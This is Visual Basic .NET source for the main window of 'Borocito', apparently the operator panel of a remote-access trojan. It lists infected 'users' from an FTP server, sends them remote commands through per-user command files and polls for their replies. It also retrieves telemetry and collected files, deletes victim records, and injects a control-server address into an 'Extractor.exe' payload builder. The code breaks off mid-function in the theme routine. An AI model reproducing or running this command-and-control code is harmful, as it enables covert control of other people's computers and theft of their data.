Imports System.IO
Imports System.Net
Public Class Main
    Dim IsThreadReadCMDServerRunning As Boolean = False
    Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
    Dim isMonoChannel As Boolean = True
    Dim isCommandFileBusy As Boolean = False

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Main_Users_Command_TabPage.Enabled = False
        Busy_Panel.Dock = DockStyle.Fill
        parameters = Command()
        ReadParameters(parameters)
    End Sub
    Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
            Process.Start("https://github.com/Zhenboro/Borocito")
            Threading.Thread.Sleep(500)
            Process.Start("https://github.com/Zhenboro")
        End If
    End Sub
    Private Sub LoaderTimer_Tick(sender As Object, e As EventArgs) Handles LoaderTimer.Tick
        LoadIt()
    End Sub
    Sub LoadIt()
        Try
            Busy_Panel.Visible = True
            LoaderTimer.Stop()
            LoaderTimer.Enabled = False
            Init()
            Theme_CheckBox.Checked = isThemeActive
        Catch ex As Exception
            Status_Label.Text = AddToLog("LoadIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Main_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.F5 Then
            Connected_Label.Text = "Reloading..."
            ResetIt()
            Init()
        End If
    End Sub

    Sub ResetIt()
        Try
            Main_Users_User_ListBox.Items.Clear()
            Main_Telemetry_Telemetry_ListBox.Items.Clear()
            Main_Telemetry_Files_ListBox.Items.Clear()
        Catch ex As Exception
            Status_Label.Text = AddToLog("ResetIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_Users_User_ListBox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Main_Users_User_ListBox.SelectedIndexChanged
        SetTarget(Main_Users_User_ListBox.SelectedItem)
        If Not isMultiSelectMode Then
            Main_Users_Command_RichTextBox.SelectionColor = Color.Yellow
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & Main_Users_Label.Text)
            If isThemeActive Then
                Main_Users_Command_RichTextBox.SelectionColor = Color.LimeGreen
            Else
                Main_Users_Command_RichTextBox.SelectionColor = Color.Black
            End If
        End If
    End Sub
    Private Sub Main_Users_User_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Users_User_ListBox.MouseDoubleClick
        SetTarget(Main_Users_User_ListBox.SelectedItem)
        Dim threadGetUserInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetUserInfo))
        threadGetUserInfo.Start()
        'GetUserInfo()
    End Sub
    Private Sub Main_Telemetry_Telemetry_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Telemetry_Telemetry_ListBox.MouseDoubleClick
        Dim threadGetTelemetryInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryInfo))
        threadGetTelemetryInfo.Start(Main_Telemetry_Telemetry_ListBox.SelectedItem)
        'GetTelemetryInfo(ListBox2.SelectedItem)
    End Sub
    Private Sub Main_Telemetry_Files_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Telemetry_Files_ListBox.MouseDoubleClick
        Dim threadGetTelemetryFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryFile))
        threadGetTelemetryFile.Start(Main_Telemetry_Files_ListBox.SelectedItem)
        'GetTelemetryFile(ListBox3.SelectedItem)
    End Sub

    Private Sub Theme_CheckBox_CheckedChanged(sender As Object, e As EventArgs) Handles Theme_CheckBox.CheckedChanged
        ThemeManager(Theme_CheckBox.Checked)
        isThemeActive = Theme_CheckBox.Checked
        SaveRegedit()
    End Sub
    Private Sub Main_Users_User_ListBox_KeyDown(sender As Object, e As KeyEventArgs) Handles Main_Users_User_ListBox.KeyDown
        If e.KeyCode = Keys.ShiftKey Then
            If isMultiSelectMode Then
                Main_Users_User_ListBox.SelectionMode = SelectionMode.One
                isMultiSelectMode = False
            Else
                Main_Users_User_ListBox.SelectionMode = SelectionMode.MultiSimple
                isMultiSelectMode = True
            End If
        End If
    End Sub
    Private Sub Main_Users_Command_ComboBox_TextChanged(sender As Object, e As EventArgs) Handles Main_Users_Command_ComboBox.TextChanged
        If Main_Users_Command_ComboBox.Text.ToLower Like "*@multichannel*" Then
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Multi channel activated!" & vbCrLf)
            isMonoChannel = False
            Main_Users_Command_ComboBox.Text = Nothing
        ElseIf Main_Users_Command_ComboBox.Text.ToLower Like "*@monochannel*" Then
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Mono channel activated!" & vbCrLf)
            isMonoChannel = True
            Main_Users_Command_ComboBox.Text = Nothing
        ElseIf Main_Users_Command_ComboBox.Text.ToLower Like "*@exit*" Then
            End
        End If
    End Sub

    Sub SetCMDStatus(ByVal response As String, ByVal status As String, Optional ByVal ScrollRichBox As Boolean = True)
        Try
            If response <> Nothing Then
                Main_Users_Command_RichTextBox.SelectionColor = Color.Lime
                Main_Users_Command_RichTextBox.AppendText(response)
                Main_Users_Command_RichTextBox.SelectionColor = Color.LimeGreen
            End If
            Status_Label.Text = status
            If ScrollRichBox Then
                Main_Users_Command_RichTextBox.ScrollToCaret()
            End If
        Catch ex As Exception
            Status_Label.Text = AddToLog("SetCMDStatus@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetTarget(ByVal userValue As String)
        Try
            If isMultiSelectMode Then
                Main_Users_Label.Text = "Target: <multiselect>"
                Main_Users_Command_TabPage.Enabled = True
            Else
                Main_Users_Label.Text = "Target: " & userValue
                userTarget = userValue
                userIDTarget = userTarget.Replace("userID_", Nothing)
                userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
                Main_Users_Command_TabPage.Enabled = True
            End If
        Catch ex As Exception
            Status_Label.Text = AddToLog("SetTarget@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_Users_Command_ComboBox_KeyDown(sender As Object, e As KeyEventArgs) Handles Main_Users_Command_ComboBox.KeyDown
        If e.KeyCode = Keys.Enter Then
            If Main_Users_Command_ComboBox.Text <> Nothing Then
                If isMultiSelectMode Then
                    For Each usuario As String In Main_Users_User_ListBox.SelectedItems
                        SendCommandFile(usuario, Main_Users_Command_ComboBox.Text)
                    Next
                    Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Server: Commands Sended! (" & Main_Users_Command_ComboBox.Text & ") to " & Main_Users_User_ListBox.SelectedItems.Count & " users")
                Else
                    SendCommandFile(userIDTarget, Main_Users_Command_ComboBox.Text)
                End If
                Status_Label.Text = Nothing
                If IsThreadReadCMDServerRunning = False Then
                    Status_Label.Text = "CMD Response thread started!"
                    ThreadReadCMDServer.Start()
                    IsThreadReadCMDServerRunning = True
                End If
            End If
        ElseIf e.KeyCode = Keys.ControlKey Then
            If IsThreadReadCMDServerRunning = False Then
                Status_Label.Text = "CMD Response thread started!"
                ThreadReadCMDServer.Start()
                IsThreadReadCMDServerRunning = True
            End If
        End If
    End Sub
    Dim LastUserResponse As String = Nothing
    Sub ReadCommandFile()
        While True
            Try
                Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
                Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                If Not isCommandFileBusy Then
                    'Actualizamos el contenido del fichero de comando directo (para el multiCanal)
                    If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                        My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
                    End If
                    My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", My.Computer.FileSystem.ReadAllText(LocalCommandFile), False)
                End If
                'Leer
                Dim RAW_Response As String() = IO.File.ReadAllLines(LocalCommandFile)
                Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
                If TheResponse = LastUserResponse Then
                    If TheResponse <> Nothing Then
                        SetCMDStatus(Nothing, "The response (" & TheResponse & ") is equal to last", False)
                    Else
                        SetCMDStatus(Nothing, "The command (" & IO.File.ReadAllLines(LocalCommandFile)(1).Split(">"c)(1).Trim() & ")  is equal to last", False)
                    End If
                Else
                    LastUserResponse = TheResponse
                    If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
                        SetCMDStatus(vbCrLf & RAW_Response(0).Split("|")(1) & ": " & LastUserResponse, Nothing)
                    End If
                End If
            Catch ex As Exception
                Status_Label.Text = AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
    Sub SendCommandFile(ByVal user As String, ByVal command As String)
        isCommandFileBusy = True
        Status_Label.Text = "Sending command..."
        user = user.Replace("userID_", Nothing)
        user = user.Replace(".rtp", Nothing)
        userIDTarget = user
        Try
            Dim Lineas = IO.File.ReadAllLines(DIRCommons & "\userCommand.str")
            If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
            End If
            Dim commandHeader As String = Lineas(0).Trim() 'header
            Dim secundaryCommand As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
            Dim persistentCommand As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
            If Not isMonoChannel Then
                secundaryCommand = InputBox("Set secundary command", "Multi channel " & userIDTarget, secundaryCommand)
                persistentCommand = InputBox("Set persistent command", "Multi channel " & userIDTarget, persistentCommand)
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", commandHeader &
                                                    vbCrLf & "Command1>" & command &
                                                    vbCrLf & "Command2>" & secundaryCommand &
                                                    vbCrLf & "Command3>" & persistentCommand &
                                                    vbCrLf & "[Response]", False)
            My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
            If Not isMultiSelectMode Then
                Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
            End If
            LastUserResponse = Nothing
            Main_Users_Command_RichTextBox.ScrollToCaret()
            Main_Users_Command_ComboBox.Text = Nothing
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
        End Try
        isCommandFileBusy = False
    End Sub
    Private Function LeerFicheroDesdeLinea(ByVal numeroLinea As Integer, ByVal nombreFichero As String) As String
        Dim fichero As New System.IO.FileInfo(nombreFichero)
        LeerFicheroDesdeLinea = Nothing
        If fichero.Exists Then
            Dim sr As System.IO.StreamReader = Nothing
            Dim lineaActual As Integer = 1
            Try
                sr = New System.IO.StreamReader(fichero.FullName)
                While lineaActual < numeroLinea And Not sr.EndOfStream
                    sr.ReadLine()
                    lineaActual += 1
                End While
                LeerFicheroDesdeLinea = sr.ReadToEnd
            Catch ex As Exception
                Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Error: " & ex.Message)
                Console.WriteLine("[LeerFicheroDesdeLinea@Main]Error: " & ex.Message)
            Finally
                If sr IsNot Nothing Then
                    sr.Close()
                    sr.Dispose()
                End If
            End Try
        End If
    End Function

    Private Sub Main_Inject_Button_Click(sender As Object, e As EventArgs) Handles Main_Inject_Button.Click
        Dim injectableOpener As New OpenFileDialog
        injectableOpener.Filter = "All file types|*.*"
        injectableOpener.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        injectableOpener.Title = "Abrir ejecutable inyectable..."
        injectableOpener.FileName = "Extractor.exe"
        If injectableOpener.ShowDialog() = DialogResult.OK Then
            Dim injectableSaver As New SaveFileDialog
            injectableSaver.Filter = "Executable file|*.exe"
            injectableSaver.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            injectableSaver.Title = "Guardar ejecutable inyectado..."
            injectableSaver.FileName = "Extractor"
            If injectableSaver.ShowDialog() = DialogResult.OK Then
                If Main_Inject_TextBox.Text <> Nothing Then
                    PutInject(Main_Inject_TextBox.Text, injectableOpener.FileName, injectableSaver.FileName)
                Else
                    If MessageBox.Show("No ha ingresado un servidor para inyectar." & vbCrLf & "¿Desea usar el servidor actual?", "Injector", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                        PutInject(HttpOwnerServer, injectableOpener.FileName, injectableSaver.FileName)
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub Main_General_Globals_Button_Click(sender As Object, e As EventArgs) Handles Main_General_Globals_Button.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\Globals.ini"
            Dim RemoteFilePath As String = HostOwnerServer & "/Globals.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_Globals_RichTextBox.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Globals aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendGlobalsSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Main_General_BoroGet_Config_Button_Click(sender As Object, e As EventArgs) Handles Main_General_BoroGet_Config_Button.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\BoroGet_config.ini"
            Dim RemoteFilePath As String = HostOwnerServer & "/Boro-Get/config.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_BoroGet_Config_RichTextBox.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Boro-Get Configuration aplicado.", MsgBoxStyle.Information, "Configuracion Servidor Boro-Get")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendBoroGet(config)Settings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Main_General_BoroGet_Repositories_Button_Click(sender As Object, e As EventArgs) Handles Main_General_BoroGet_Repositories_Button.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\BoroGet_Repositories.ini"
            Dim RemoteFilePath As String = HostOwnerServer & "/Boro-Get/Repositories.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_BoroGet_Repositories_RichTextBox.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Boro-Get Repositories aplicado.", MsgBoxStyle.Information, "Configuracion Servidor Boro-Get")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendBoroGet(Repositories)Settings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "LocalThings"
    Sub IndexUsersToPanel()
        Try
            Main_Users_User_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading user files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Users"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                linea = linea.Replace(".rtp", Nothing)
                linea = linea.Replace("userID_", Nothing)
                Main_Users_User_ListBox.Items.Add(linea)
            Next
            Main_Users_User_ListBox.Items.Remove(".")
            Main_Users_User_ListBox.Items.Remove("..")
            Main_Users_User_ListBox.Items.Remove("Commands")
            reader.Close()
            Status_Label.Text = "User files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexUsersToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub IndexTelemetryToPanel()
        Try
            Main_Telemetry_Telemetry_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading telemetry files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Telemetry"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                linea = linea.Replace(".tlm", Nothing)
                linea = linea.Replace("telemetry_", Nothing)
                Main_Telemetry_Telemetry_ListBox.Items.Add(linea)
            Next
            Main_Telemetry_Telemetry_ListBox.Items.Remove(".")
            Main_Telemetry_Telemetry_ListBox.Items.Remove("..")
            Main_Telemetry_Telemetry_ListBox.Items.Remove("tlmRefresh.php")
            reader.Close()
            Status_Label.Text = "Telemetry files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexTelemetryToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub IndexTelemetryFilesToPanel()
        Try
            Main_Telemetry_Files_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading repository files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Files"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                Main_Telemetry_Files_ListBox.Items.Add(linea)
            Next
            Main_Telemetry_Files_ListBox.Items.Remove(".")
            Main_Telemetry_Files_ListBox.Items.Remove("..")
            reader.Close()
            Status_Label.Text = "Telemetry repository files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexTelemetryFilesToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteTelemetryFile(ByVal fileName As String)
        Try
            Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Files/" & fileName), FtpWebRequest)
            request.Method = WebRequestMethods.Ftp.DeleteFile
            request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
            Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
            response.Close()
        Catch ex As Exception
            Status_Label.Text = AddToLog("DeleteTelemetryFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteUserFile(ByVal user As String)
        user = user.Replace("userID_", Nothing)
        Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/userID_" & user & ".rtp"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Status_Label.Text = AddToLog("DeleteUserFile(UserFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
            End Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/Commands/[" & user & "]Command.str"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Status_Label.Text = AddToLog("DeleteUserFile(CommandFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
            End Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Telemetry/telemetry_" & user & ".tlm"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Status_Label.Text = AddToLog("DeleteUserFile(TelemetryFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
            End Try
        Catch ex As Exception
            Status_Label.Text = AddToLog("DeleteUserFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetTelemetryInfo(ByVal fileName As String)
        Try
            Dim LocalTelemetryFile As String = DIRCommons & "\telemetry_" & fileName & ".tlm"
            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Telemetry/telemetry_" & fileName & ".tlm"
            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
            End If
            My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
            Main_Telemetry_Telemetry_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalTelemetryFile)
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetTelemetryInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetTelemetryFile(ByVal file As String)
        Try
            Dim downloadRefresh As Boolean = False
            Status_Label.Text = "WAIT: Asking file info..."
            Dim LocalTelemetryFile As String = DIRCommons & "\" & file
            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Files/" & file
            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                If MessageBox.Show("El fichero ya existe en local." & vbCrLf & "¿Desea descargarlo nuevamente?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                    Status_Label.Text = "WAIT: Downloading file from remote repository..."
                    My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
                Else
                    Status_Label.Text = "WAIT: Opening file from local repository..."
                    downloadRefresh = True
                End If
            End If
            If Not downloadRefresh Then
                If Main_Telemetry_Files_CheckBox.Checked Then
                    My.Computer.Network.DownloadFile(HostOwnerServer & "/Files/" & file, LocalTelemetryFile, HostOwnerServerUser, HostOwnerServerPassword)
                Else
                    My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
                End If
            End If
            Status_Label.Text = "File ready! Asking for confirmation..."
            If MessageBox.Show("¿Abrir el fichero '" & file & "'?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                Process.Start(LocalTelemetryFile)
            Else
                Process.Start("explorer.exe", "/select, " & LocalTelemetryFile)
            End If
            Status_Label.Text = Nothing
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetTelemetryFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetUserInfo()
        Try
            Dim LocalUserFile As String = DIRCommons & "\userID_" & userIDTarget & ".rtp"
            Dim RemoteUserFile As String = HttpOwnerServer & "/Users/userID_" & userIDTarget & ".rtp"
            If My.Computer.FileSystem.FileExists(LocalUserFile) Then
                My.Computer.FileSystem.DeleteFile(LocalUserFile)
            End If
            My.Computer.Network.DownloadFile(RemoteUserFile, LocalUserFile)
            Main_Users_User_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalUserFile)
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetUserInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

#Region "ToolStrip Items"
    Private Sub RecargarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem.Click
        Dim threadIndexTelemetryFilesToPanel As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf IndexTelemetryFilesToPanel))
        threadIndexTelemetryFilesToPanel.Start()
        'IndexTelemetryFilesToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem.Click
        Dim threadDeleteTelemetryFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf DeleteTelemetryFile))
        threadDeleteTelemetryFile.Start(Main_Telemetry_Files_ListBox.SelectedItem)
        'DeleteTelemetryFile(ListBox3.SelectedItem)
    End Sub
    Private Sub Label_Status_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Status_Label.MouseDoubleClick
        Status_Label.Text = Nothing
        LastUserResponse = Nothing
    End Sub
    Private Sub RecargarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem1.Click
        Dim threadIndexUsersToPanel As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf IndexUsersToPanel))
        threadIndexUsersToPanel.Start()
        'IndexUsersToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem1.Click
        If MessageBox.Show("Esta accion eliminara todos los archivos relacionados a este usuario." & vbCrLf & "¿Eliminar el usuario" & Main_Users_User_ListBox.SelectedItem & "?", "Eliminar usuario", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
            Dim threadDeleteUserFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf DeleteUserFile))
            threadDeleteUserFile.Start(Main_Users_User_ListBox.SelectedItem)
            'DeleteUserFile(ListBox1.SelectedItem)
        End If
    End Sub

    Private Sub RecargarTodoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecargarTodoToolStripMenuItem.Click
        Main_KeyDown(Me, New KeyEventArgs(Keys.F5))
    End Sub
    Private Sub ConfiguracionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ConfiguracionToolStripMenuItem.Click

    End Sub
    Private Sub SalirToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SalirToolStripMenuItem.Click
        End
    End Sub
#End Region

    Sub ThemeManager(ByVal applyTheme As Boolean)
        Try
            If applyTheme Then
                'Aplicar thema
                Me.BackColor = Color.FromArgb(50, 50, 50)
                Me.BackColor = Color.Black
                Me.ForeColor = Color.LimeGreen
            Else
                'Desaplicar tema
                Me.BackColor = DefaultBackColor
                Me.ForeColor = DefaultForeColor
            End If

            For Each pagina As TabPage In Main_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_Users_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_General_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_General_BoroGet_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_Telemetry_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            Main_Users_User_GroupBox.BackColor = Me.BackColor
            Main_Users_User_GroupBox.ForeColor = Me.ForeColor

            Main_Users_Command_GroupBox.BackColor = Me.BackColor
            Main_Users_Command_GroupBox.ForeColor = Me.ForeColor

            Main_Inject_GroupBox.BackColor = Me.BackColor
            Main_Inject_GroupBox.ForeColor = Me.ForeColor

            Main_Users_User_RichTextBox.BackColor = Me.BackColor
            Main_Users_User_RichTextBox.ForeColor = Me.ForeColor

            Main_Users_Command_RichTextBox.BackColor = Me.BackColor
            Main_Users_Command_RichTextBox.ForeColor = Me.ForeColor

            Main_Telemetry_Telemetry_RichTextBox.BackColor = Me.BackColor
            Main_Telemetry_Telemetry_RichTextBox.ForeColor = Me.ForeColor

            Main_General_Globals_RichTextBox.BackColor = Me.BackColor
            Main_General_Globals_RichTextBox.ForeColor = Me.ForeColor

            Main_General_BoroGet_Config_RichTextBox.BackColor = Me.BackColor
            Main_General_BoroGet_Config_RichTextBox.ForeColor = Me.ForeColor

            Main_General_BoroGet_Repositories_RichTextBox.BackColor = Me.BackColor
            Main_General_BoroGet_Repositories_RichTextBox.ForeColor = Me.ForeColor

            Main_Users_User_ListBox.BackColor = Me.BackColor
            Main_Users_User_ListBox.ForeColor = Me.ForeColor

